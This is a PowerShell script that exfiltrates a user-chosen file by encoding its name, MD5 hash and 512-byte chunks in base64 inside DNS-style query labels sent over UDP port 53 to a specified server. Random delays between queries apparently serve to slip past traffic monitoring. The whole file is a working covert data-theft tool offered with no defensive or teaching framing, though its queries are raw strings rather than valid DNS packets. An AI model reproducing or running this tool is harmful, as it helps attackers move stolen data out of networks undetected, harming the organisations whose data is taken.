# Set DNS Server and Domain
$DNS_PORT = 53
$domain = "fileupload.domain.com"  # Domain to use

# Function to resolve a DNS name to an IP address if necessary
function Resolve-DnsNameOrIp {
    param (
        [string]$server
    )

    # Check if the input is already a valid IP address
    if ([System.Net.IPAddress]::TryParse($server, [ref]$null)) {
        return $server  # Return the valid IP address as-is
    } else {
        # Attempt to resolve the DNS name to an IP address
        try {
            $resolvedIP = [System.Net.Dns]::GetHostAddresses($server) | Where-Object { $_.AddressFamily -eq 'InterNetwork' }
            if ($resolvedIP.Count -gt 0) {
                return $resolvedIP[0].IPAddressToString  # Return the first resolved IPv4 address
            } else {
                throw "No IPv4 address found for the DNS name."
            }
        } catch {
            Write-Host "Error: Unable to resolve '$server' to an IP address." -ForegroundColor Red
            throw $_  # Re-throw the exception to handle it elsewhere
        }
    }
}

# Function to calculate MD5 hash of a file
function Calculate-MD5 {
    param (
        [string]$filePath
    )

    $md5 = [System.Security.Cryptography.MD5]::Create()
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $hashBytes = $md5.ComputeHash($fileStream)
    $fileStream.Close()

    return [BitConverter]::ToString($hashBytes) -replace '-'
}

# Function to send a DNS query with a random delay
function Send-DNSQuery {
    param (
        [string]$data,
        [string]$server,
        [double]$maxDelay
    )

    # Resolve DNS name or use IP address
    try {
        $serverIP = Resolve-DnsNameOrIp -server $server
        $serverEndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($serverIP), $DNS_PORT)
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $queryBytes = [System.Text.Encoding]::ASCII.GetBytes($data)
        
        $udpClient.Send($queryBytes, $queryBytes.Length, $serverEndPoint)
        $udpClient.Close()

        # Add a random delay between 0.1 seconds and the user-provided maximum delay
        $delay = Get-Random -Minimum 0.1 -Maximum $maxDelay
        Write-Host "Query sent, delaying next query by $([Math]::Round($delay, 2)) seconds."
        Start-Sleep -Seconds $delay
    } catch {
        Write-Host "Error sending DNS query: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Function to send file information (filename and MD5 hash)
function Send-FileInfo {
    param (
        [string]$fileName,
        [string]$fileMD5,
        [string]$server,
        [string]$domain,
        [double]$maxDelay
    )

    $encodedFileName = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($fileName)) -replace '='
    $encodedFileMD5 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($fileMD5)) -replace '='

    $query = "f.$encodedFileName.$encodedFileMD5.$domain"
    Write-Host "Sending file info: $fileName, MD5: $fileMD5"
    Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
}

# Function to send file in chunks with randomized query sending
function Send-FileChunks {
    param (
        [string]$filePath,
        [string]$server,
        [string]$domain,
        [double]$maxDelay
    )

    $fileSize = (Get-Item $filePath).Length
    $chunkSize = 512  # Size of each chunk in bytes
    $totalChunks = [Math]::Ceiling($fileSize / $chunkSize)

    $fileStream = [System.IO.File]::OpenRead($filePath)
    $chunkNumber = 0

    while ($chunkNumber -lt $totalChunks) {
        $buffer = New-Object byte[] $chunkSize
        $bytesRead = $fileStream.Read($buffer, 0, $chunkSize)
        $encodedChunkData = [Convert]::ToBase64String($buffer[0..($bytesRead-1)])

        $query = "c$chunkNumber.$($encodedChunkData -replace '=','').$domain"
        Write-Host "Sending chunk $chunkNumber"
        Send-DNSQuery -data $query -server $server -maxDelay $maxDelay

        $chunkNumber++
    }

    $fileStream.Close()
}

# Function to signal end of transmission
function Send-EndSignal {
    param (
        [string]$server,
        [string]$domain,
        [double]$maxDelay
    )

    $query = "e.end.$domain"
    Write-Host "Sending end of transmission signal"
    Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
}

# Main function to send the file
function Send-File {
    param (
        [string]$filePath,
        [double]$maxDelay,
        [string]$server
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileMD5 = Calculate-MD5 -filePath $filePath

    # Send file info (filename and MD5 hash)
    Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -server $server -domain $domain -maxDelay $maxDelay

    # Send file chunks with random delays
    Send-FileChunks -filePath $filePath -server $server -domain $domain -maxDelay $maxDelay

    # Signal the end of transmission
    Send-EndSignal -server $server -domain $domain -maxDelay $maxDelay
}

# Example usage of the main function
$filePath = Read-Host "Enter the file path to send:"
$server = Read-Host "Enter the DNS name or IP address of the server (ex. domain.com):"
$maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries:")
Send-File -filePath $filePath -maxDelay $maxDelay -server $server
